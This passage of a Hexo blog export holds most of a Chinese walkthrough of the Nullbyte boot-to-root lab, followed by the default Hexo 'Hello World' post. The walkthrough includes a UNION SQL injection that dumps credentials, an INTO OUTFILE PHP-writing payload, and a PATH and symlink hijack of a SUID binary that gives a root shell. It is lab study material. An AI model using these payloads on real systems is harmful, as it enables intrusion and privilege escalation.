alt="1"></p><blockquote><p>果然是两张空表<br>转回seth库：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/Nullbyte/24.png" alt="1"></p><blockquote><p>只有users表：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/Nullbyte/25.png" alt="1"></p><blockquote><p>把数据全dump出来：</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">&quot; union select 6,7,group_concat(id,0x7c,user,0x7c,pass,0x7c,position,0x7c) from users#<br></code></pre></td></tr></table></figure><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/Nullbyte/26.png" alt="1"></p><blockquote><p>得到一个ramses的凭据：<br>id：ramses<br>pass：YzZkNmJkN2ViZjgwNmY0M2M3NmFjYzM2ODE3MDNiODE </p></blockquote><blockquote><p>解码：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/Nullbyte/29.png" alt="1"></p><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/Nullbyte/30.png" alt="1"></p><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/Nullbyte/31.png" alt="1"></p><blockquote><p>成功解出最终凭据：<br>ramses@omega</p></blockquote><blockquote><p>尝试登录ssh、phpmyadmin：</p></blockquote><h2 id="0x03-获得立足点-ssh777端口"><a href="#0x03-获得立足点-ssh777端口" class="headerlink" title="0x03 获得立足点(ssh777端口)"></a>0x03 获得立足点(ssh777端口)</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ssh -p 777 ramses@10.10.10.130<br></code></pre></td></tr></table></figure><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/Nullbyte/32.png" alt="1"></p><blockquote><p>ssh登录成功，直接拿到了立足点，感觉无需再去尝试phpmyadmin的登录<br>开始做信息收集，先完善tty：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/Nullbyte/33.png" alt="1"></p><blockquote><p>1、枚举home目录，都无写权限，放弃写公钥横向提权</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/Nullbyte/34.png" alt="1"></p><blockquote><p>2、sudo枚举，没有任何结果</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/Nullbyte/35.png" alt="1"></p><blockquote><p>3、自动任务枚举：</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> /etc/cron<br></code></pre></td></tr></table></figure><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/Nullbyte/36.png" alt="1"></p><blockquote><p>4、s位枚举：</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">find / -perm -u=s -<span class="hljs-built_in">type</span> f 2&gt;/dev/null<br></code></pre></td></tr></table></figure><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/Nullbyte/37.png" alt="1"></p><blockquote><p>一眼看到最特殊的&#x2F;var&#x2F;www&#x2F;backup&#x2F;procwatch，基本可以肯定它有问题<br>且gtfobins查询其余文件均无法s位提权</p></blockquote><h2 id="0x04-suid提权"><a href="#0x04-suid提权" class="headerlink" title="0x04 suid提权"></a>0x04 suid提权</h2><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/Nullbyte/38.png" alt="1"></p><blockquote><p>很遗憾只有执行权限，先执行一次看看：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/Nullbyte/39.png" alt="1"></p><blockquote><p>好像是执行了一次ps和sh的操作，并把ps的结果返回了？<br>感觉可以软链接提权：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/Nullbyte/40.png" alt="1"></p><blockquote><p>因为不太熟悉这种提权方式，不知道为什么不太行…<br>突然想到可以劫持ps的环境变量，实现指向sh：</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">export</span> PATH=/tmp:<span class="hljs-variable">$PATH</span><br><span class="hljs-built_in">export</span> PATH=.:<span class="hljs-variable">$PATH</span><br></code></pre></td></tr></table></figure><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/Nullbyte/41.png" alt="1"></p><blockquote><p>成功提权</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/Nullbyte/42.png" alt="1"></p><blockquote><p>拿到凭证</p></blockquote><h2 id="0x05-自我反思补足"><a href="#0x05-自我反思补足" class="headerlink" title="0x05 自我反思补足"></a>0x05 自我反思补足</h2><h3 id="sql注入写马"><a href="#sql注入写马" class="headerlink" title="sql注入写马"></a>sql注入写马</h3><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/Nullbyte/50.png" alt="1"></p><blockquote><p>当时还向&#x2F;tmp目录写做了尝试，打完后发现tmp的确实写进去了</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/Nullbyte/43.png" alt="1"></p><blockquote><p>查看web根目录权限，发现是因为mysql用户并无该目录的写权限</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/Nullbyte/44.png" alt="1"></p><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/Nullbyte/45.png" alt="1"></p><h3 id="软链接提权"><a href="#软链接提权" class="headerlink" title="软链接提权"></a>软链接提权</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">ln</span> -s &lt;target&gt; &lt;link_name&gt;<br></code></pre></td></tr></table></figure><blockquote><p>link_name为被劫持文件</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/Nullbyte/46.png" alt="1"></p><blockquote><p>首先被劫持文件不能已经存在，否则报错<br>其次如果想要强制替换已存在的被劫持文件，参数可改为-sf，但也需要有写权限</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/Nullbyte/47.png" alt="1"></p><blockquote><p>所以一般情况下，软链接提权要和环境变量劫持一同使用，如下：<br>(由于当前目录也有写权限，直接把当前目录写入环境变量即可)</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/Nullbyte/48.png" alt="1"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">ln</span> -s /bin/sh ps<br></code></pre></td></tr></table></figure><blockquote><p>即在当前目录生成一个ps文件，并软链接指向&#x2F;bin&#x2F;sh</p></blockquote><blockquote><p>之后执行 <code>./procwatch</code> 触发root sh</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/Nullbyte/49.png" alt="1"></p><h2 id="0x06-总结"><a href="#0x06-总结" class="headerlink" title="0x06 总结"></a>0x06 总结</h2><ol><li>端口扫描：80 web服务，777 ssh服务</li><li>web渗透：从图片详细信息得到隐藏路径，在sql注入失败的情况下对隐藏路径的登录key值进行爆破，成功进到连接数据库的查询页面；使用联合查询对其注入，得到用户信息，解码后为ssh凭据</li><li>提权：通过ssh获得立足点，枚举发现root身份的s位脚本文件，该脚本以root身份执行ps命令；通过劫持ps命令的执行文件，换为执行sh，获得root shell；此处亦可通过软链接劫持ps命令达到相同效果</li></ol><h2 id="0x07-看wp及视频后反思补足"><a href="#0x07-看wp及视频后反思补足" class="headerlink" title="0x07 看wp及视频后反思补足"></a>0x07 看wp及视频后反思补足</h2><blockquote><p>对于自我反思补足部分的勘误补足：<br>虽然&#x2F;var&#x2F;www&#x2F;html目录整体并无写入权限，但是存在uploads页面，不妨大胆推测此处可进行写操作，尝试对&#x2F;var&#x2F;www&#x2F;html&#x2F;uploads写马：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/Nullbyte/50.png" alt="1"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">&quot; union select 6,7,&#x27;&lt;?php phpinfo();?&gt;&#x27; into outfile &#x27;/var/www/html/uploads/info.php&#x27;#<br></code></pre></td></tr></table></figure><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/Nullbyte/51.png" alt="1"></p><blockquote><p>接着写马弹shell即可</p></blockquote><blockquote><p>反思：盲打阶段虽然考虑到了尝试写马，但当发现不能直接写到网站根目录时放弃过早，即使没有从uploads的名字联想到可以写数据，也应该根据目录爆破结果逐个尝试(intruder)</p></blockquote>]]></content>
    
    
    
    <tags>
      
      <tag>pentest</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Hello World</title>
    <link href="/2024/03/22/hello-world/"/>
    <url>/2024/03/22/hello-world/</url>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo new <span class="hljs-string">&quot;My New Post&quot;</span><br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo server<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo generate<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo deploy<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
